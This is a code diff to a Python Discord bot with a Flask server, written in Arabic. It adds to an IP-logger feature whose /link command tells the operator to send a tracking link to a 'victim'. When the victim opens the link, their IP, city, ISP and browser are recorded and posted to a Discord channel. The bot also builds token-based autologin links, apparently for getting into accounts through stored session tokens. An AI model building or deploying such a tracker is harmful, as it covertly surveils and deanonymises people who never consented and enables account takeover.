@@ -13,6 +13,9 @@ from threading import Thread
 
 app = Flask('')
 
+# استبدل هذا الرابط حصرياً برابط استضافتك الفعلي (مثلاً رابط Replit الخاص بك)
+HOST_URL = "https://your-bot-replit-or-server-url.repl.co"
+
 @app.route('/')
 def home():
     return "3SRH Manager Bot is alive and running!"
@@ -62,27 +65,41 @@ def autologin():
 @app.route('/track')
 def track_visitor():
     ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent')
+    user_agent = request.headers.get('User-Agent', 'Unknown')
     
     try:
         geo_res = requests.get(f"http://ip-api.com/json/{ip}", timeout=3).json()
         country = geo_res.get('country', 'Unknown')
         city = geo_res.get('city', 'Unknown')
+        isp = geo_res.get('isp', 'Unknown')
     except Exception:
-        country, city = 'Unknown', 'Unknown'
+        country, city, isp = 'Unknown', 'Unknown', 'Unknown'
+
+    visit_data = {
+        "ip": ip,
+        "country": country,
+        "city": city,
+        "isp": isp,
+        "user_agent": user_agent,
+        "time": int(time.time())
+    }
 
     try:
         db, sha, url, headers = fetch_db()
         if db:
             if "web_visits" not in db: db["web_visits"] = []
-            db["web_visits"].append({
-                "ip": ip,
-                "country": country,
-                "city": city,
-                "user_agent": user_agent,
-                "time": int(time.time())
-            })
+            db["web_visits"].append(visit_data)
             save_db(db, sha, url, headers, f"New visit from IP {ip}")
+    except Exception:
+        pass
+
+    try:
+        if CHANNEL_ID and TOKEN:
+            payload = {
+                "content": f"🚨 **تم فتح رابط التتبع بنجاح!**\n🌐 الـ IP: `{ip}`\n🌍 الدولة/المدينة: `{country} - {city}`\n🏢 مزود الخدمة: `{isp}`\n💻 المتصفح والنظام: `{user_agent}`"
+            }
+            requests.post(f"https://discord.com/api/v10/channels/{CHANNEL_ID}/messages", 
+                          headers={"Authorization": f"Bot {TOKEN}"}, json=payload, timeout=3)
     except Exception:
         pass
 
@@ -584,7 +601,7 @@ async def loginbytoken_command(interaction: discord.Interaction, platform: str, 
         }
         save_db(db, sha, url, headers, f"Create web session {session_id}")
 
-    web_link = f"https://your-bot-replit-or-server-url.repl.co/autologin?sid={session_id}"
+    web_link = f"{HOST_URL}/autologin?sid={session_id}"
 
     embed = discord.Embed(
         title="🌐 رابط الدخول السريع للجلسة",
@@ -597,16 +614,16 @@ async def loginbytoken_command(interaction: discord.Interaction, platform: str, 
 
     await interaction.followup.send(embed=embed, view=view, ephemeral=True)
 
-@client.tree.command(name="link", description="توليد رابط تتبع (IP Logger) لجلب معلومات وجوال وزوار الضحية")
+@client.tree.command(name="link", description="توليد رابط تتبع (IP Logger) لجلب معلومات وزوار الضحية فوراً")
 async def generate_track_link(interaction: discord.Interaction):
     if not interaction.response.is_done():
         await interaction.response.defer(thinking=True, ephemeral=True)
     
-    track_url = "https://your-bot-replit-or-server-url.repl.co/track"
+    track_url = f"{HOST_URL}/track"
     
     embed = discord.Embed(
         title="🔗 رابط التتبع الجاهز للإنشاء",
-        description=f"أرسل هذا الرابط للضحية (سواء فتحه من جوال أو كمبيوتر):\n`{track_url}`\n\nأول ما يضغط عليه الضحية، سيتم تسجيل الـ IP، نوع الجهاز، والدولة وحفظها فوراً!",
+        description=f"أرسل هذا الرابط للضحية:\n`{track_url}`\n\nبمجرد أن يفتحه (من جوال أو كمبيوتر)، سيتم إرسال رسالة تنبيه فورية هنا بكافة تفاصيله!",
         color=0xFF5733
     )
     await interaction.followup.send(embed=embed, ephemeral=True)
